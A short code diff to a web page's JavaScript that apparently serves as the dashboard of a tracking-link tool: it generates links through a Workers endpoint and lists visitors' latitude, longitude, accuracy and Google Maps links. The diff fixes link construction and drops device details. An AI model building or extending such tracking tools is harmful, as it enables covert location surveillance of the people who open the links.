@@ -103,7 +103,7 @@ input{
 </div>
 
 <script>
-const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev/";
+const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
 const seen = new Set();
 
 function generate(){
@@ -111,7 +111,7 @@ function generate(){
  .then(r=>r.json())
  .then(d=>{
    link.style.display="block";
-   link.value = API + d.link;
+   link.value = d.link;   // ✅ FIXED
  });
 }
 
@@ -138,11 +138,6 @@ async function load(){
 
       <small>Accuracy</small><br>
       ${u.acc || "—"} meters<br><br>
-
-      <small>Device</small><br>
-      ${u.device?.platform || ""}<br>
-      ${u.device?.screen || ""}<br>
-      ${u.device?.language || ""}<br><br>
 
       <a target="_blank"
        href="https://www.google.com/maps?q=${u.lat},${u.lng}">
